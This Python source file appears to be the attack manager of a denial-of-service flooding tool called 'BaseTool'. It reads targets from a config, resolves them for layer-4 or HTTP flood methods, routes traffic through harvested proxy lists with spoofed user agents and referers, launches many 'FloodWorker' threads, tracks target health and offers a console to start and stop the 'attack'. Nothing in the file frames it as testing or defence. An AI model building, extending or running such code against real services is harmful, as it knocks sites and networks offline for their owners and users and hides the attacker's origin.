from __future__ import annotations

import logging
import os
import signal
import socket
import sys
import threading
import time
from typing import Dict, List, Optional, Tuple

from PyRoxy import Proxy
from yarl import URL

from ..adapter.methods import L4_METHODS, METHOD_REGISTRY
from .health import TargetHealth, capacity_health_loop, health_watchdog_loop
from .monitor import monitor_loop
from .proxy_manager import ProxyManager
from ..redaction import mask_target_label
from .scheduler import (
    MAX_WORKER_THREADS,
    FloodWorker,
    TargetJob,
    TargetScheduler,
)

logger = logging.getLogger("BaseTool")


class AttackManager:
    def __init__(self, config: dict, proxy_providers: list, json_output: bool = False):
        self.config = config
        self.proxy_providers = proxy_providers
        self.json_output = json_output
        self.event = threading.Event()
        self.threads: List[threading.Thread] = []
        self.monitor_thread = None
        self.health_thread = None
        self.capacity_thread = None
        self.worker_count = 0
        self.target_stats: Dict[str, List[int]] = {}
        self.stats_lock = threading.Lock()
        self.target_health = TargetHealth()
        self._proxy_list: Optional[List[Proxy]] = None
        self._proxies_loaded = False
        self.target_keys: List[str] = []
        self.resolved_targets: List[str] = []
        self.table_height = 0
        self.proxy_mode = "direct"
        self.scheduler: Optional[TargetScheduler] = None
        self.target_jobs: List[TargetJob] = []

    def _load_proxies_if_needed(self, proxy_enabled: int, check_url: str) -> Optional[List[Proxy]]:
        if proxy_enabled == 0:
            return None
        if not self._proxies_loaded:
            self._proxy_list = ProxyManager.get_proxies(self.proxy_providers, check_url)
            self._proxies_loaded = True
        return self._proxy_list

    def _build_target_jobs(self) -> Tuple[List[TargetJob], List[str], List[str], int]:
        jobs: List[TargetJob] = []
        target_keys: List[str] = []
        resolved_targets: List[str] = []

        settings = self.config.get("settings", {})
        worker_budget = max(1, min(int(settings.get("threads", 100)), MAX_WORKER_THREADS))
        default_rpc = settings.get("rpc", 1)
        default_proxy = settings.get("proxy", 0)
        self.proxy_mode = "proxy" if int(default_proxy) > 0 else "direct"

        ua_list = set(self.config.get("useragents", []))
        if not ua_list:
            ua_list = {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
            }
        ref_list = set(self.config.get("referers", []))
        if not ref_list:
            ref_list = {"https://www.google.com/", "https://www.bing.com/"}

        targets = self.config.get("targets")
        if not targets:
            raise ValueError("config.json must define at least one target")

        for target in targets:
            method = target["method"].upper()
            if method not in METHOD_REGISTRY:
                raise ValueError(f"Unsupported method: {method}")

            target_str = target["target"]
            ip = target.get("ip")
            rpc = target.get("rpc", default_rpc)
            proxy_enabled = target.get("proxy", default_proxy)

            if method in L4_METHODS:
                if "://" in target_str:
                    _, rest = target_str.split("://", 1)
                else:
                    rest = target_str
                if ":" in rest:
                    ip_part, port_part = rest.rsplit(":", 1)
                else:
                    ip_part, port_part = rest, "80"
                port = int(port_part)
                try:
                    actual_ip = ip if ip else socket.gethostbyname(ip_part)
                except socket.gaierror as exc:
                    logger.warning(
                        "Skipping unresolvable target %s: %s",
                        mask_target_label(target_str),
                        exc,
                    )
                    continue
                key = f"{actual_ip}:{port}"
                target_keys.append(key)
                resolved_targets.append(f"{method} {actual_ip}:{port}")
                jobs.append(
                    TargetJob(
                        method=method,
                        target_key=key,
                        layer4_addr=(actual_ip, port),
                        useragents=ua_list,
                        referers=ref_list,
                    )
                )
            else:
                url = URL(target_str)
                hostname = url.host
                try:
                    actual_ip = ip if ip else socket.gethostbyname(hostname)
                except socket.gaierror as exc:
                    logger.warning(
                        "Skipping unresolvable target %s: %s",
                        mask_target_label(target_str),
                        exc,
                    )
                    continue
                port = url.port or (443 if url.scheme.lower() == "https" else 80)
                key = f"{hostname}:{port}"
                target_keys.append(key)
                resolved_targets.append(f"{method} {hostname}:{port}")
                proxies = self._load_proxies_if_needed(proxy_enabled, str(url))
                jobs.append(
                    TargetJob(
                        method=method,
                        target_key=key,
                        url=url,
                        host=actual_ip,
                        rpc=rpc,
                        proxies=set(proxies) if proxies else None,
                        useragents=ua_list,
                        referers=ref_list,
                    )
                )

        seen = set()
        unique_keys: List[str] = []
        for key in target_keys:
            if key not in seen:
                seen.add(key)
                unique_keys.append(key)

        return jobs, unique_keys, resolved_targets, worker_budget

    def _spawn_workers(self, jobs: List[TargetJob], worker_budget: int) -> None:
        self.threads.clear()
        if not jobs:
            return

        self.target_jobs = jobs
        worker_count = max(1, min(worker_budget, MAX_WORKER_THREADS))
        self.worker_count = worker_count
        self.scheduler = TargetScheduler(jobs, self.target_health, worker_count)

        for worker_id in range(worker_count):
            worker = FloodWorker(
                worker_id,
                self.scheduler,
                self.event,
                self.target_stats,
                self.stats_lock,
                self.target_health,
            )
            self.threads.append(worker)

    def _spawn_threads(self) -> List[str]:
        """Backward-compatible alias used by tests and legacy callers."""
        jobs, keys, resolved, worker_budget = self._build_target_jobs()
        self.resolved_targets = resolved
        self._spawn_workers(jobs, worker_budget)
        return keys

    def _calculate_table_height(self):
        try:
            term_height = os.get_terminal_size().lines
        except (ValueError, OSError):
            term_height = 24
        needed = len(self.target_keys) + 4
        return max(5, min(needed, term_height - 2))

    def _display_stream(self):
        return sys.stderr if self.json_output else sys.stdout

    def start(self):
        if self.event.is_set():
            logger.warning("Already running")
            return

        jobs, self.target_keys, self.resolved_targets, worker_budget = self._build_target_jobs()
        self._spawn_workers(jobs, worker_budget)
        if not self.threads:
            logger.warning("No resolvable targets to launch.")
            return

        self.table_height = self._calculate_table_height()

        display = self._display_stream()
        display.write("\033[2J\033[H")
        for _ in range(self.table_height):
            print(file=display)
        print("Type start/stop/exit", file=display)

        with self.stats_lock:
            self.target_stats.clear()

        if self.proxy_mode == "proxy" and not self._proxies_loaded:
            probe_url = "http://httpbin.org/get"
            for target in self.config.get("targets", []):
                method = str(target.get("method", "")).upper()
                if method not in L4_METHODS:
                    probe_url = str(target.get("target", probe_url))
                    break
            self._load_proxies_if_needed(1, probe_url)

        for resolved in self.resolved_targets:
            logger.info("Resolved target %s", mask_target_label(resolved))

        if self.proxy_mode == "direct":
            logger.info(
                "Connectivity mode: direct (proxy disabled). "
                "If targets time out, enable proxy/VPN or check firewall/routing."
            )
        else:
            if self._proxy_list:
                logger.info(
                    "Connectivity mode: proxy enabled (%s working proxies loaded)",
                    len(self._proxy_list),
                )
            elif self._proxies_loaded:
                logger.warning(
                    "Connectivity mode: proxy enabled but no working proxies loaded; "
                    "proxy pool exhausted — stop/start module to refresh or check network route"
                )
            else:
                logger.info("Connectivity mode: proxy enabled (loading proxy providers...)")

        logger.info(
            "Launching %s worker threads for %s targets (global budget=%s)...",
            len(self.threads),
            len(jobs),
            worker_budget,
        )
        for thread in self.threads:
            thread.start()
        self.event.set()

        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=0.5)
        self.monitor_thread = threading.Thread(
            target=monitor_loop,
            args=(
                self.event,
                self.target_stats,
                self.stats_lock,
                self.target_keys,
                self.table_height,
                self.json_output,
            ),
            daemon=True,
        )
        self.monitor_thread.start()

        if self.health_thread and self.health_thread.is_alive():
            self.health_thread.join(timeout=0.5)
        self.health_thread = threading.Thread(
            target=health_watchdog_loop,
            args=(self.event, self.target_health, self.target_keys, self.proxy_mode),
            daemon=True,
        )
        self.health_thread.start()

        if self.capacity_thread and self.capacity_thread.is_alive():
            self.capacity_thread.join(timeout=0.5)
        self.capacity_thread = threading.Thread(
            target=capacity_health_loop,
            args=(
                self.event,
                self.target_health,
                self.target_keys,
                self.target_stats,
                self.stats_lock,
                self.scheduler,
                self.worker_count,
                self.proxy_mode,
            ),
            daemon=True,
        )
        self.capacity_thread.start()

    def stop(self):
        if not self.event.is_set():
            logger.warning("Attack not running.")
            return
        self.event.clear()
        time.sleep(0.2)
        logger.info("Attack stopped.")


def _shutdown_manager(manager: AttackManager) -> None:
    if manager.event.is_set():
        manager.stop()


def console(manager: AttackManager):
    def _handle_sigterm(_signum, _frame):
        _shutdown_manager(manager)
        sys.exit(0)

    signal.signal(signal.SIGTERM, _handle_sigterm)

    manager.start()

    while True:
        prompt_row = manager.table_height + 1
        display = manager._display_stream()
        display.write(f"\033[{prompt_row};1H\033[K")
        display.flush()
        try:
            cmd = input("BaseTool> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            cmd = "exit"

        if cmd == "start":
            if not manager.event.is_set():
                manager.start()
            else:
                print("Already running.")
        elif cmd == "stop":
            manager.stop()
        elif cmd in ("exit", "quit"):
            _shutdown_manager(manager)
            break
        elif cmd:
            print("Unknown command. Available: start, stop, exit")
